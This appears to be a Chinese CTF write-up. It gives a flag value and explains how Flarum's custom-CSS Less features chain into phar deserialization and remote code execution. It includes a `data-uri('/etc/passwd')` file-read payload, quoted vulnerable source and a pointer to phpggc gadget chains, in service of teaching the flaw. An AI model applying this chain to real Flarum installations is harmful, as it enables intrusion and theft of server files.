flag04: flag{f783b5e1-d3a6-445a-a239-2359db4a134c}



### Flarum漏洞原理

虽然p神在跳跳糖写的已经很详细了，我在这里还是简单的复述一遍

首先是三种压缩文件对脏数据的容忍度：

* ZIP，zip的文件头尾都可以有脏字符，通过对偏移量的修复就可以重新获得一个合法的zip文件。但是否遵守这个规则，仍然取决于zip解析器，经过测试，phar解析器如果发现文件头不是zip格式，即使后面偏移量修复完成，也将触发错误：

> internal corruption of phar (truncated manifest header)

* tar，如果能控制文件头，即可构造合法的tar文件，即使文件尾有垃圾字符。
* phar格式，必须控制文件尾，但不需要控制文件头。PHP在解析时会在文件内查找`<?php __HALT_COMPILER(); ?>`这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串`GBMB`结尾。

也就是说我们控制文件尾部没有脏数据就能用phar进行文件包含

Flarum支持Less语法，而且就出现在一个php后台经常存在的功能点：自定义CSS样式

[Less](https://lesscss.org/)是一个完全兼容CSS的语言，并在CSS的基础上提供了很多高级语法与功能

#### phar包含点

Less中有一个data-uri函数，用于读取文件并转换成data协议输出在css，依照官方用法如下

```css
.test {
  content: data-uri('/etc/passwd');
}
```

用data-uri可以达到任意文件读取，其对应的php源码如下。关注到调用的file_get_contents，这个函数同样支持phar协议

```php
public function datauri( $mimetypeNode, $filePathNode = null ) {
    $filePath = ( $filePathNode ? $filePathNode->value : null );
    // ...

    if ( file_exists( $filePath ) ) {
        $buf = @file_get_contents( $filePath );
    } else {
        $buf = false;
    }
    // ...
}
```

>php 8.0以上不支持phar反序列化

刚好Flarum输入自定义CSS代码的时候将会把渲染完成后的CSS文件写入Web目录的assets/forum.css文件

Flarum生成的CSS是分成三部分，如下，可以通过将所有扩展都禁用来去除第三部分CSS。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218204335183.png)

那么我们能不能直接用data-uri写入phar文件呢？这里datauri中间省略了一部分代码，用户输入的内容会先校验是否满足Less或CSS的格式。如果直接向框内传入一个phar格式的文件，将会直接导致保存出错，无法正常写入文件。

#### phar写入点

刚好Less还有`@import`用于导入外部CSS，它的php源码如下：

```php
if ( $this->options['inline'] ) {
    // todo needs to reference css file not import
    //$contents = new Less_Tree_Anonymous($this->root, 0, array('filename'=>$this->importedFilename), true );

    Less_Parser::AddParsedFile( $full_path );
    $contents = new Less_Tree_Anonymous( file_get_contents( $full_path ), 0, array(), true );

    if ( $this->features ) {
        return new Less_Tree_Media( array( $contents ), $this->features->value );
    }

    return array( $contents );
}
```

也是一个file_get_contents。但是这里就没有文件判断了，因为这个函数的功能就是import，而众所周知的是，`file_get_contents`支持`data:`协议，所以可以通过`data:`协议来控制读取的文件内容。

在`@import`语句后面指定`inline`选项即可进入这个if

因此整个漏洞的利用过程为：

通过`@import (inline)`和`data:`协议的方式可以向assets/forum.css文件的开头写入任意字符，再通过`data-uri('phar://...')`的方式包含这个文件，触发反序列化漏洞，最后执行任意命令。

最后一个问题是，phar的matadate块应该装什么链子以触发反序列化RCE？

#### PHP反序列化

flarum framework的composer内有各个依赖库的版本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251218210313276.png)

如果是本地项目，composer audit可以检查这些安全项

不过phpggc可以直接列出有的组件链子，monolog 1.16就在其中

https://xz.aliyun.com/news/5081
